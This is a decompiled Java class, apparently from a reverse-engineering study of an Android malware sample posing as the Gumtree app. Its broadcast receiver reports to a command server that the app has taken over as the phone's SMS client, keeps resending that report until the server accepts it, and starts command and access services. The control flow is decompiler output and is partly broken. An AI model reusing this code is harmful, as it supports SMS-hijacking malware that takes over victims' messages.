package com.gumsis.srs.rcv;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.gumsis.MainActivity;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.checktls.IntTls;
import com.gumsis.checktls.Print;
import com.gumsis.srs.api.requests.SendReportRequest;
import com.gumsis.srs.api.requests.data.ReportData;
import com.gumsis.srs.api.responses.StatusResponse;

public class RtlkReceiver
  extends BroadcastReceiver
{
  private void parseChangeMSCl(Context paramContext, String paramString, StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendChangeMSClToServer(paramContext, paramString, 60000L);
        }
        return;
      }
      sendChangeMSClToServer(paramContext, paramString, 60000L);
      return;
    }
    sendChangeMSClToServer(paramContext, paramString, 60000L);
  }
  
  private void sendAccessStatusRequest(Context paramContext, ReportData paramReportData)
  {
    paramContext = new SendReportRequest(paramContext, 25, paramReportData);
    HTTPServer.getInstance().doRequest(paramContext);
  }
  
  private void sendChangeMSClToServer(final Context paramContext, final String paramString, long paramLong)
  {
    paramContext = new SendReportRequest(paramContext, 27, new ReportData("move_sms_client_done", Realtalk.getPreviousRid(paramContext), paramString), new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, HttpResponse paramAnonymousHttpResponse)
      {
        RtlkReceiver.this.parseChangeMSCl(paramContext, paramString, (StatusResponse)paramAnonymousHttpResponse);
      }
    });
    HTTPServer.getInstance().doRequestDelayed(paramContext, paramLong);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (paramIntent != null)
    {
      try
      {
        switch (paramIntent.getIntExtra("status", -1))
        {
        case 18: 
          paramIntent = new Intent(paramContext, MainActivity.class);
          paramIntent.setFlags(268435456);
          paramContext.startActivity(paramIntent);
          return;
        }
      }
      catch (Exception paramContext)
      {
        Print.e(paramContext.toString());
        return;
      }
      IntTls.startCommandService(paramContext);
      IntTls.startDialogAccessService(paramContext);
      return;
      paramIntent = paramIntent.getStringExtra("str_access_status");
      if (paramIntent != null)
      {
        sendAccessStatusRequest(paramContext, new ReportData("access", paramIntent));
        return;
        paramIntent = paramIntent.getStringExtra("str_move_sms_client_status");
        if (paramIntent != null)
        {
          sendChangeMSClToServer(paramContext, paramIntent, 0L);
          return;
        }
      }
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/rcv/RtlkReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */